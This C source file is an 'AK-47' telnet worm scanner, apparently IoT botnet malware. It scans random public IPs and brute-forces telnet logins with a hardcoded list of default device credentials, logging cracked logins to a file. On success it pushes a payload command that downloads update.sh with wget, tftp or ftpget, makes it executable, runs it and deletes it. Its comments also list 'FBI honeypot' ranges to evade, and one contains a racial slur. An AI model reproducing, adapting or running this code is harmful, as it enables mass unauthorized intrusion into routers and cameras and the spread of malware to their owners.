#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <strings.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <poll.h>
#include <netdb.h>
#include <time.h>
#include <net/if.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <resolv.h>
//amp setting
#define MAX_PACKET_SIZE 1024
#define PHI 0x9e3779b9

//telnet scanner stuff
#define BUFFER_SIZE 1024
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254

#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12

#define OPT_SGA   3
#define SOCKBUF_SIZE 1024


// Telnet scanner payload, must end with \r\n\0
char *rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://0.0.0.0/update.sh; busybox wget http://0.0.0.0/update.sh; tftp -r update.sh -g 0.0.0.0; busybox tftp -r update.sh -g 0.0.0.0; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 update.sh update.sh; chmod 777 update.sh; busybox chmod 777 update.sh; sh update.sh; rm -rf update.sh\r\n\0";

char *usernames[] = {
    "\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "root\0",
    "admin\0",
    "root\0",
    "default\0",
    "user\0",
    "guest\0",
    "daemon\0",
    "admin\0",
    "admin\0",
    "root\0",
    "admin\0",
    "adm\0",
    "guest\0",
    "root\0",
    "root\0",
    "telnet\0",
    "root\0",
    "admin\0",
    "admin\0",
    "Administrator\0",
    "root\0",
    "mg3500\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "default\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "admin1\0",
    "ubnt\0",
    "support\0",
    "root\0",
    "user\0",
    "guest\0"
};

char *passwords[] = {
    "\0",
    "root\0",
    "password\0",
    "\0",
    "Zte521\0",
    "vizxv\0",
    "000000\0",
    "14567\0",
    "hi3518\0",
    "user\0",
    "pass\0",
    "admin14\0",
    "7ujMko0admin\0",
    "00000000\0",
    "<>\0",
    "klv1\0",
    "klv14\0",
    "oelinux1\0",
    "realtek\0",
    "1111\0",
    "54321\0",
    "antslq\0",
    "zte9x15\0",
    "system\0",
    "1456\0",
    "888888\0",
    "ikwb\0",
    "default\0",
    "juantech\0",
    "xc3511\0",
    "support\0",
    "1111111\0",
    "service\0",
    "145\0",
    "4321\0",
    "tech\0",
    "<>\0",
    "abc1\0",
    "7ujMko0admin\0",
    "switch\0",
    "admin14\0",
    "\0",
    "1111\0",
    "meinsm\0",
    "pass\0",
    "smcadmin\0",
    "14567890\0",
    "14\0",
    "admin1\0",
    "password\0",
    "admin\0",
    "anko\0",
    "xc3511\0",
    "1456\0",
    "\0",
    "guest\0",
    "145\0",
    "xc3511\0",
    "admin\0",
    "Zte521\0",
    "\0",
    "user\0",
    "guest\0",
    "\0",
    "password\0",
    "admin1\0",
    "ikwb\0",
    "14567890\0",
    "\0",
    "\0",
    "1456\0",
    "root\0",
    "telnet\0",
    "zte9x15\0",
    "meinsm\0",
    "\0",
    "\0",
    "antslq\0",
    "merlin\0",
    "switch\0",
    "7ujMko0admin\0",
    "abc1\0",
    "<>\0",
    "tech\0",
    "4321\0",
    "default\0",
    "145\0",
    "service\0",
    "1111111\0",
    "admin14\0",
    "pass\0",
    "user\0",
    "hi3518\0",
    "password\0",
    "ubnt\0",
    "zlxx.\0",
    "14567\0",
    "000000\0"
};

char *advances[] = {
    ":",
    "ser",
    "ogin",
    "name",
    "pass",
    "dvrdvs",
    (char *) 0
};
char *fails[] = {
    "nvalid",
    "ailed",
    "ncorrect",
    "enied",
    "error",
    "goodbye",
    "bad",
    "timeout",
    (char *) 0
};
char *successes[] = {
    "$",
    "#",
    ">",
    "@",
    "shell",
    "dvrdvs",
    "usybox",
    (char *) 0
};
char *advances2[] = {
    ":",
    "nvalid",
    "ailed",
    "ncorrect",
    "enied",
    "rror",
    "oodbye",
    "bad",
    "busybox",
    "$",
    "#",
    (char *) 0
};
char *legit[] = {
    "AK47",
    (char *) 0
};
char *infected[] = {
    "CAPSAICIN",
    (char *) 0
};

int scanPid = 0;

struct telstate_t {
    int fd;
    unsigned int ip;
    unsigned char state;
    unsigned char complete;
    unsigned char usernameInd; /* username     */
    unsigned char passwordInd; /* password     */
    unsigned int totalTimeout; /* totalTimeout */
    char *sockbuf;
};

struct ipstate_t {
    int fd;
    unsigned int ip;
    unsigned char state;
    unsigned char complete;
    unsigned char usernameInd;
    unsigned char passwordInd;
    unsigned int totalTimeout;
    unsigned int telPort;
    char *sockbuf;
};

static uint32_t Q[4096], c = 362436;

void init_rand(uint32_t x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++)
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

uint32_t rand_cmwc(void)
{
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1)&4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if(x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

static void printchar(unsigned char ** str, int c) {
    if (str) { **
        str = c;
        ++( * str);
    } else(void) write(1,&c, 1);
}
static int prints(unsigned char ** out,
    const unsigned char *string, int width, int pad) {
    register int pc = 0, padchar = ' ';
    if (width > 0) {
        register int len = 0;
        register
        const unsigned char *ptr;
        for (ptr = string;* ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad&PAD_ZERO) padchar = '0';
    }
    if (!(pad&PAD_RIGHT)) {
        for (; width > 0; --width) {
            printchar(out, padchar);
            ++pc;
        }
    }
    for (;* string; ++string) {
        printchar(out, * string);
        ++pc;
    }
    for (; width > 0; --width) {
        printchar(out, padchar);
        ++pc;
    }
    return pc;
}
static int printi(unsigned char ** out, int i, int b, int sg, int width, int pad, int letbase) {
    unsigned char print_buf[PRINT_BUF_LEN];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;
    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints(out, print_buf, width, pad);
    }
    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }

    s = print_buf + PRINT_BUF_LEN - 1;
    * s = '\0';
    while (u) {
        t = u % b;
        if (t >= 10)
            t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }
    if (neg) {
        if (width && (pad&PAD_ZERO)) {
            printchar(out, '-');
            ++pc;
            --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints(out, s, width, pad);
}
static int print(unsigned char ** out,
    const unsigned char *format, va_list args) {
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];
    for (;* format != 0; ++format) {
        if ( * format == '%') {
            ++format;
            width = pad = 0;
            if ( * format == '\0') break;
            if ( * format == '%') goto out;
            if ( * format == '-') {
                ++format;
                pad = PAD_RIGHT;
            }
            while ( * format == '0') {
                ++format;
                pad |= PAD_ZERO;
            }
            for (;* format >= '0' && * format <= '9'; ++format) {
                width *= 10;
                width += * format - '0';
            }
            if ( * format == 's') {
                register char *s = (char *) va_arg(args, int);
                pc += prints(out, s ? s : "(null)", width, pad);
                continue;
            }
            if ( * format == 'd') {
                pc += printi(out, va_arg(args, int), 10, 1, width, pad, 'a');
                continue;
            }
            if ( * format == 'x') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'a');
                continue;
            }
            if ( * format == 'X') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'A');
                continue;
            }
            if ( * format == 'u') {
                pc += printi(out, va_arg(args, int), 10, 0, width, pad, 'a');
                continue;
            }
            if ( * format == 'c') {
                scr[0] = (unsigned char) va_arg(args, int);
                scr[1] = '\0';
                pc += prints(out, scr, width, pad);
                continue;
            }
        } else {
            out: printchar(out, * format);
            ++pc;
        }
    }
    if (out) ** out = '\0';
    va_end(args);
    return pc;
}

int szprintf(unsigned char *out,
    const unsigned char *format, ...) {
    va_list args;
    va_start(args, format);
    return print(&out, format, args);
}

char *thanks = "thanks to unhappygh0st for the honeypot ip ranges :)";

in_addr_t getDatIP() {
    uint8_t ipState[4] = {
        0
    };
    ipState[0] = rand() % 255;
    ipState[1] = rand() % 255;
    ipState[2] = rand() % 255;
    ipState[3] = rand() % 255;

    while (
        (ipState[0] == 0) ||
        (ipState[0] == 10) ||
        (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
        (ipState[0] == 127) ||
        (ipState[0] == 169 && ipState[1] == 254) ||
        (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
        (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
        (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
        (ipState[0] == 192 && ipState[1] == 168) ||
        (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
        (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
        (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
        (ipState[0] == 62 && ipState[1] <= 30) || //Honeypot
        (ipState[0] == 207 && ipState[1] >= 31 && ipState[2] <= 120) || //FBI Honeypots (207.31.0.0 - 207.120.255.255) 
        (ipState[0] == 65) && (ipState[1] >= 224) && (ipState[2] <= 226) || // More FBI Honeypots (64.224.0.0 - 64.226.255.255)
        (ipState[0] == 195) && (ipState[1] == 10) || //Yet another FBI Honeypot. 
        (ipState[0] == 216) && (ipState[1] == 25 || ipState[1] == 94) || //Fucking nigger LOL (FBI Honeypots)
        (ipState[0] == 212) && (ipState[1] == 56) || //The fuck?! 212.56.107.22 - uhhhhm. FBI Honeypot. 
        (ipState[0] >= 224) && (ipState[0] <= 239) //Multicast ip ranges
    ) {
        ipState[0] = rand() % 255;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
    }

    char ip[16] = {
        0
    };
    szprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
    return inet_addr(ip);
}
int negotiate(int sock, unsigned char *buf, int len) {
    unsigned char c;
    switch (buf[1]) {
    case CMD_IAC:
        return 0;
    case CMD_WILL:
    case CMD_WONT:
    case CMD_DO:
    case CMD_DONT:
        c = CMD_IAC;
        send(sock,&c, 1, MSG_NOSIGNAL);
        if (CMD_WONT == buf[1]) c = CMD_DONT;
        else if (CMD_DONT == buf[1]) c = CMD_WONT;
        else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
        else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
        send(sock,&c, 1, MSG_NOSIGNAL);
        send(sock,&(buf[2]), 1, MSG_NOSIGNAL);
        break;
    default:
        break;
    }

    return 0;
}

int contains_string(char *buffer, char ** strings) {
    int num_strings = 0, i = 0;
    for (num_strings = 0; strings[++num_strings] != 0;);
    for (i = 0; i < num_strings; i++) {
        if (strcasestr(buffer, strings[i])) {
            return 1;
        }
    }
    return 0;
}
int contains_success(char *buffer) {
    return contains_string(buffer, successes);
}
int contains_fail(char *buffer) {
    return contains_string(buffer, fails);
}
int contains_response(char *buffer) {
    return contains_success(buffer) || contains_fail(buffer);
}
int read_with_timeout(int fd, int timeout_usec, char *buffer, int buf_size) {
    fd_set read_set;
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = timeout_usec;
    FD_ZERO(&read_set);
    FD_SET(fd,&read_set);
    if (select(fd + 1,&read_set, NULL, NULL,&tv) < 1)
        return 0;
    return recv(fd, buffer, buf_size, 0);
}
int read_until_response(int fd, int timeout_usec, char *buffer, int buf_size, char ** strings) {
    int num_bytes, i;
    memset(buffer, 0, buf_size);
    num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
    if (&buffer[0] == "\xFF") {
        negotiate(fd, buffer, 3);
    }

    if (contains_string(buffer, strings)) {
        return 1;
    }

    return 0;
}
const char *get_telstate_host(struct telstate_t * telstate) { // get host
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = telstate->ip;
    return inet_ntoa(in_addr_ip);
}
void advance_telstate(struct telstate_t * telstate, int new_state) { // advance
    if (new_state == 0) {
        close(telstate->fd);
    }
    telstate->totalTimeout = 0;
    telstate->state = new_state;
    memset((telstate->sockbuf), 0, SOCKBUF_SIZE);
}
void reset_telstate(struct telstate_t * telstate) { // reset
    advance_telstate(telstate, 0);
    telstate->complete = 1;
}
int sclose(int fd) {
    if (3 > fd) return 1;
    close(fd);
    return 0;
}
void ak47telscan(int wait_usec, int maxfds) {
    int i, res, num_tmps, j;
    char buf[128], cur_dir;

    int max = maxfds;
    fd_set fdset;
    struct timeval tv;
    socklen_t lon;
    int valopt;

    srand(time(NULL) ^ rand_cmwc());

    char line[256];
    char *buffer;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(23);
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    buffer = malloc(BUFFER_SIZE + 1);
    memset(buffer, 0, BUFFER_SIZE + 1);

    struct telstate_t fds[max];

    memset(fds, 0, max * (sizeof(int) + 1));
    for (i = 0; i < max; i++) {
        memset(&(fds[i]), 0, sizeof(struct telstate_t));
        fds[i].complete = 1;
        fds[i].sockbuf = buffer;
    }

    while (1) {
        for (i = 0; i < max; i++) {
            if (fds[i].totalTimeout == 0) {
                fds[i].totalTimeout = time(NULL);
            }

            switch (fds[i].state) {
            case 0:
                {
                    if (fds[i].complete == 1) {
                        // clear the current fd
                        char *tmp = fds[i].sockbuf;
                        memset(&(fds[i]), 0, sizeof(struct telstate_t));
                        fds[i].sockbuf = tmp;
                        // get a new random ip
                        fds[i].ip = getDatIP();
                    } else if (fds[i].complete == 0) {
                        fds[i].passwordInd++;
                        fds[i].usernameInd++;

                        if (fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) {
                            fds[i].complete = 1;
                            continue;
                        }
                        if (fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) {
                            fds[i].complete = 1;
                            continue;
                        }
                    }

                    dest_addr.sin_family = AF_INET;
                    dest_addr.sin_port = htons(23);
                    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                    dest_addr.sin_addr.s_addr = fds[i].ip;

                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);

                    if (fds[i].fd == -1) continue;

                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);

                    if (connect(fds[i].fd, (struct sockaddr * )&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
                        reset_telstate(&fds[i]);
                    } else {
                        advance_telstate(&fds[i], 1);
                    }
                }
                break;
            case 1:
                {
                    printf("[AK-47] FOUND ---> %s:23\n", get_telstate_host(&fds[i]));
                    FD_ZERO(&fdset);
                    FD_SET(fds[i].fd,&fdset);
                    tv.tv_sec = 0;
                    tv.tv_usec = wait_usec;
                    res = select(fds[i].fd + 1, NULL,&fdset, NULL,&tv);

                    if (res == 1) {
                        lon = sizeof(int);
                        valopt = 0;
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )(&valopt),&lon);
                        //printf("%d\n",valopt);
                        if (valopt) {
                            reset_telstate(&fds[i]);
                        } else {
                            fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL)&(~O_NONBLOCK));
                            advance_telstate(&fds[i], 2);
                        }
                        continue;
                    } else if (res == -1) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (fds[i].totalTimeout + 5 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 2:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances)) {
                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else {
                            advance_telstate(&fds[i], 3);
                        }

                        continue;
                    }

                    if (fds[i].totalTimeout + 7 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 3:
                {
                    if (send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    advance_telstate(&fds[i], 4);
                }
                break;

            case 4:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances)) {
                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else {
                            advance_telstate(&fds[i], 5);
                        }
                        continue;
                    }

                    if (fds[i].totalTimeout + 3 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 5:
                {
                    if (send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    advance_telstate(&fds[i], 6);
                }
                break;

            case 6:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances2)) {
                        fds[i].totalTimeout = time(NULL);

                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else if (contains_success(fds[i].sockbuf)) {
                            if (fds[i].complete == 2) {
                                advance_telstate(&fds[i], 7);
                            } else {
                                printf("[AK-47] [-] CRACKED ---> %s:23 %s:%s\n", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                char command[1024];
                                sprintf(command, "echo '%s:23 %s:%s' >> cracked.txt", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd],  passwords[fds[i].passwordInd]);
                                system(command);
                                advance_telstate(&fds[i], 7);
                            }
                        } else {
                            reset_telstate(&fds[i]);
                        }
                        continue;
                    }

                    if (fds[i].totalTimeout + 7 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            case 7:
                {
                    fds[i].totalTimeout = time(NULL);
                    if (send(fds[i].fd, "enable\r\n", 8, MSG_NOSIGNAL) < 0) {
                        sclose(fds[i].fd);
                        fds[i].state = 0;
                        fds[i].complete = 1;
                        continue;
                    }
                    if (send(fds[i].fd, "system\r\n", 8, MSG_NOSIGNAL) < 0) {
                        sclose(fds[i].fd);
                        fds[i].state = 0;
                        fds[i].complete = 1;
                        continue;
                    }
                    if (send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0) {
                        sclose(fds[i].fd);
                        fds[i].state = 0;
                        fds[i].complete = 1;
                        continue;
                    }
                    if (send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) {
                        sclose(fds[i].fd);
                        fds[i].state = 0;
                        fds[i].complete = 1;
                        continue;
                    }
                    if(send(fds[i].fd, "echo -e '\\x41\\x4b\\x34\\x37'", 26, MSG_NOSIGNAL) < 0) {
                        sclose(fds[i].fd);
                        fds[i].state = 0;
                        fds[i].complete = 1;
                        continue;
                    }
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, legit)) {
                        if (send(fds[i].fd, rekdevice, strlen(rekdevice), MSG_NOSIGNAL) > 0) {
                            printf("[AK-47] [-] PAYLOAD SENT ---> %s:23 %s:%s\n", inet_ntoa( * (struct in_addr * )&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                            reset_telstate(&fds[i]);
                        }
                        sleep(20);
                        if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, infected)) {
                            printf("[AK-47] [+] SUCCESSFUL INFECTION ---> %s:23 %s:%s\n", inet_ntoa( * (struct in_addr * )&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                            reset_telstate(&fds[i]);
                            continue;
                        }
                        if (fds[i].totalTimeout + 60 < time(NULL)) {
                            if (fds[i].complete != 3) {
                                printf("[AK-47] [-] FAILED TO INFECT ---> %s:23 %s:%s\n", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                            }
                            reset_telstate(&fds[i]);
                        }
                    }
                    break;
                }
            }
        }
    }
}

int main(int argc, char **argv) {
    uint32_t parent;
    parent = fork();
    int forks = sysconf(_SC_NPROCESSORS_ONLN);
    int fds = forks * 512; //Far effective. 512 sockets for each CPU.
    if (parent > 0) {
        scanPid = parent;
        return 0;
    } else if (parent == -1) return 1;
    int ii;
    for (ii = 0; ii < forks; ii++) {
        srand((time(NULL) ^ getpid()) + getppid());
        init_rand(time(NULL) ^ getpid());
        ak47telscan(370, fds);
    }
    return 0;
}